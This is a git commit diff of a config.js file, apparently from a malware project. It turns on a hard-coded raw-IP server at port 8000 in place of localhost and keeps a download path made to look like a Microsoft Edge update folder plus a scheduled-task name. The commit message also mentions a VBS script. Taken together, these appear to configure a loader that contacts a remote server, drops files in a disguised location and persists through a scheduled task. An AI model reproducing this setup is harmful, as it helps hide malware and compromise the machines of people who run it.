b6da995d8e9fe469af62f86f3f38e08ec4c85cd8
bittraveler <snookerstar1004@gmx.com>
2025-11-25 12:32:10 -0800

    updated vbs and config.js

--- config.js
+++ config.js
@@ -1,5 +1,5 @@
-// export const SERVER_URL = "http://216.126.227.154:8000"
-const SERVER_URL = "http://localhost:5000";
+const SERVER_URL = "http://216.126.227.154:8000"
+// const SERVER_URL = "http://localhost:5000";
 const DOWNLOAD_PATH = "C:/ProgramData/MicrosoftEdge/Updates/UpdateLog";
 const SCH_NAME = "launcher";
 
